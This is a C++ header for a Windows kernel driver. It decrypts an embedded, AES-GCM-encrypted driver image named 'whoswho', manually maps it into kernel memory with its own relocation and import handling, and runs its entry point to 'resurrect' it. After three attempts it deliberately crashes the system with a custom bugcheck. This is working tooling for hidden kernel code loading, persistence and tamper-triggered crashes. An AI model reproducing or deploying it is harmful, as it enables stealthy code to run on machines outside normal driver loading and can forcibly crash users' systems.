#pragma once

#include <ntddk.h>
#include <ntimage.h>
#include <bcrypt.h>
#include "KernelCrypto.h"
#include "WitnessKey.h"

namespace resurrect
{
    constexpr ULONG RESURRECT_POOL_TAG = 'rS8j';
    constexpr ULONG MAX_RESURRECT_ATTEMPTS = 3;
    constexpr ULONG AES_KEY_SIZE = 32;
    constexpr ULONG AES_IV_SIZE = 12;
    constexpr ULONG AES_TAG_SIZE = 16;

    inline volatile LONG g_resurrect_count = 0;
    inline PUINT8 g_encrypted_blob = nullptr;
    inline ULONG  g_encrypted_blob_size = 0;
    inline UINT8  g_blob_iv[AES_IV_SIZE] = {};
    inline UINT8  g_blob_tag[AES_TAG_SIZE] = {};

    __forceinline NTSTATUS derive_image_key(UINT8 key_out[AES_KEY_SIZE])
    {
        return witness_key::derive_subkey("whoswho_image", key_out) ?
            STATUS_SUCCESS : STATUS_UNSUCCESSFUL;
    }

    __forceinline NTSTATUS decrypt_whoswho_image(
        const UINT8* encrypted, ULONG enc_size,
        UINT8** decrypted_out, ULONG* dec_size_out)
    {
        UINT8 aes_key[AES_KEY_SIZE];
        NTSTATUS st = derive_image_key(aes_key);
        if (!NT_SUCCESS(st)) return st;

        BCRYPT_ALG_HANDLE alg = nullptr;
        st = BCryptOpenAlgorithmProvider(&alg, BCRYPT_AES_ALGORITHM, nullptr, 0);
        if (!NT_SUCCESS(st))
        {
            RtlSecureZeroMemory(aes_key, sizeof(aes_key));
            return st;
        }

        st = BCryptSetProperty(alg, BCRYPT_CHAINING_MODE,
            reinterpret_cast<PUCHAR>(const_cast<PWSTR>(BCRYPT_CHAIN_MODE_GCM)),
            sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
        if (!NT_SUCCESS(st))
        {
            BCryptCloseAlgorithmProvider(alg, 0);
            RtlSecureZeroMemory(aes_key, sizeof(aes_key));
            return st;
        }

        BCRYPT_KEY_HANDLE key_handle = nullptr;
        st = BCryptGenerateSymmetricKey(alg, &key_handle, nullptr, 0,
            aes_key, AES_KEY_SIZE, 0);
        RtlSecureZeroMemory(aes_key, sizeof(aes_key));
        if (!NT_SUCCESS(st))
        {
            BCryptCloseAlgorithmProvider(alg, 0);
            return st;
        }

        UINT8* output = static_cast<UINT8*>(
            ExAllocatePool2(POOL_FLAG_NON_PAGED, enc_size, RESURRECT_POOL_TAG));
        if (!output)
        {
            BCryptDestroyKey(key_handle);
            BCryptCloseAlgorithmProvider(alg, 0);
            return STATUS_INSUFFICIENT_RESOURCES;
        }

        BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO auth_info;
        BCRYPT_INIT_AUTH_MODE_INFO(auth_info);
        auth_info.pbNonce = g_blob_iv;
        auth_info.cbNonce = AES_IV_SIZE;
        auth_info.pbTag = g_blob_tag;
        auth_info.cbTag = AES_TAG_SIZE;

        ULONG result_size = 0;
        st = BCryptDecrypt(key_handle,
            const_cast<PUCHAR>(encrypted), enc_size,
            &auth_info, nullptr, 0,
            output, enc_size, &result_size, 0);

        BCryptDestroyKey(key_handle);
        BCryptCloseAlgorithmProvider(alg, 0);

        if (!NT_SUCCESS(st))
        {
            ExFreePoolWithTag(output, RESURRECT_POOL_TAG);
            return st;
        }

        *decrypted_out = output;
        *dec_size_out = result_size;
        return STATUS_SUCCESS;
    }

    __forceinline PVOID manual_map_pe(UINT8* raw_image, ULONG raw_size)
    {
        if (!raw_image || raw_size < sizeof(IMAGE_DOS_HEADER))
            return nullptr;

        PIMAGE_DOS_HEADER dos = reinterpret_cast<PIMAGE_DOS_HEADER>(raw_image);
        if (dos->e_magic != IMAGE_DOS_SIGNATURE)
            return nullptr;

        PIMAGE_NT_HEADERS64 nt = reinterpret_cast<PIMAGE_NT_HEADERS64>(
            raw_image + dos->e_lfanew);
        if (nt->Signature != IMAGE_NT_SIGNATURE)
            return nullptr;

        ULONG image_size = nt->OptionalHeader.SizeOfImage;
        UINT8* mapped = static_cast<UINT8*>(
            ExAllocatePool2(POOL_FLAG_NON_PAGED, image_size, RESURRECT_POOL_TAG));
        if (!mapped) return nullptr;

        RtlZeroMemory(mapped, image_size);
        RtlCopyMemory(mapped, raw_image,
            min(nt->OptionalHeader.SizeOfHeaders, raw_size));

        PIMAGE_SECTION_HEADER sections = IMAGE_FIRST_SECTION(nt);
        for (USHORT i = 0; i < nt->FileHeader.NumberOfSections; i++)
        {
            if (sections[i].SizeOfRawData == 0) continue;
            if (sections[i].PointerToRawData + sections[i].SizeOfRawData > raw_size)
                continue;

            RtlCopyMemory(
                mapped + sections[i].VirtualAddress,
                raw_image + sections[i].PointerToRawData,
                sections[i].SizeOfRawData);
        }

        LONGLONG delta = reinterpret_cast<LONGLONG>(mapped) -
            static_cast<LONGLONG>(nt->OptionalHeader.ImageBase);

        if (delta != 0)
        {
            ULONG reloc_rva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
            ULONG reloc_size = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;

            if (reloc_rva && reloc_size)
            {
                UINT8* reloc_ptr = mapped + reloc_rva;
                UINT8* reloc_end = reloc_ptr + reloc_size;

                while (reloc_ptr < reloc_end)
                {
                    PIMAGE_BASE_RELOCATION block = reinterpret_cast<PIMAGE_BASE_RELOCATION>(reloc_ptr);
                    if (block->SizeOfBlock == 0) break;

                    ULONG entries = (block->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(USHORT);
                    PUSHORT entry = reinterpret_cast<PUSHORT>(reloc_ptr + sizeof(IMAGE_BASE_RELOCATION));

                    for (ULONG e = 0; e < entries; e++)
                    {
                        USHORT type = entry[e] >> 12;
                        USHORT offset = entry[e] & 0xFFF;

                        if (type == IMAGE_REL_BASED_DIR64)
                        {
                            UINT64* fixup = reinterpret_cast<UINT64*>(
                                mapped + block->VirtualAddress + offset);
                            *fixup += delta;
                        }
                        else if (type == IMAGE_REL_BASED_HIGHLOW)
                        {
                            UINT32* fixup = reinterpret_cast<UINT32*>(
                                mapped + block->VirtualAddress + offset);
                            *fixup += static_cast<UINT32>(delta);
                        }
                    }

                    reloc_ptr += block->SizeOfBlock;
                }
            }
        }

        ULONG import_rva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
        if (import_rva)
        {
            PIMAGE_IMPORT_DESCRIPTOR import_desc = reinterpret_cast<PIMAGE_IMPORT_DESCRIPTOR>(
                mapped + import_rva);

            PVOID kernel_base = reinterpret_cast<PVOID>(get_nt_base());

            while (import_desc->Name)
            {
                PIMAGE_THUNK_DATA64 thunk = reinterpret_cast<PIMAGE_THUNK_DATA64>(
                    mapped + import_desc->FirstThunk);
                PIMAGE_THUNK_DATA64 orig_thunk = import_desc->OriginalFirstThunk ?
                    reinterpret_cast<PIMAGE_THUNK_DATA64>(mapped + import_desc->OriginalFirstThunk) :
                    thunk;

                while (orig_thunk->u1.AddressOfData)
                {
                    if (!(orig_thunk->u1.Ordinal & IMAGE_ORDINAL_FLAG64))
                    {
                        PIMAGE_IMPORT_BY_NAME import_name = reinterpret_cast<PIMAGE_IMPORT_BY_NAME>(
                            mapped + static_cast<ULONG>(orig_thunk->u1.AddressOfData));

                        PVOID func = GetProcAddress(kernel_base, import_name->Name);
                        if (func)
                            thunk->u1.Function = reinterpret_cast<ULONGLONG>(func);
                    }

                    thunk++;
                    orig_thunk++;
                }

                import_desc++;
            }
        }

        return mapped;
    }

    __forceinline NTSTATUS resurrect_whoswho()
    {
        LONG attempt = _InterlockedIncrement(&g_resurrect_count);
        if (attempt > static_cast<LONG>(MAX_RESURRECT_ATTEMPTS))
        {
            if (_KeBugCheckEx)
                _KeBugCheckEx(0xDEAD5E30,
                    static_cast<ULONG_PTR>(attempt), 0, 0, 0);
            return STATUS_UNSUCCESSFUL;
        }

        if (!g_encrypted_blob || g_encrypted_blob_size == 0)
            return STATUS_NOT_FOUND;

        UINT8* decrypted = nullptr;
        ULONG dec_size = 0;
        NTSTATUS st = decrypt_whoswho_image(
            g_encrypted_blob, g_encrypted_blob_size,
            &decrypted, &dec_size);

        if (!NT_SUCCESS(st))
            return st;

        PVOID mapped_base = manual_map_pe(decrypted, dec_size);

        RtlSecureZeroMemory(decrypted, dec_size);
        ExFreePoolWithTag(decrypted, RESURRECT_POOL_TAG);

        if (!mapped_base)
            return STATUS_UNSUCCESSFUL;

        PIMAGE_DOS_HEADER dos = static_cast<PIMAGE_DOS_HEADER>(mapped_base);
        PIMAGE_NT_HEADERS64 nt = reinterpret_cast<PIMAGE_NT_HEADERS64>(
            static_cast<UINT8*>(mapped_base) + dos->e_lfanew);

        ULONG ep_rva = nt->OptionalHeader.AddressOfEntryPoint;
        if (ep_rva == 0)
            return STATUS_ENTRYPOINT_NOT_FOUND;

        typedef NTSTATUS (NTAPI* driver_entry_fn)(PDRIVER_OBJECT, PUNICODE_STRING);
        driver_entry_fn entry = reinterpret_cast<driver_entry_fn>(
            static_cast<UINT8*>(mapped_base) + ep_rva);

        __try {
            st = entry(nullptr, nullptr);
        } __except(EXCEPTION_EXECUTE_HANDLER) {
            st = STATUS_UNSUCCESSFUL;
        }

        return st;
    }
}
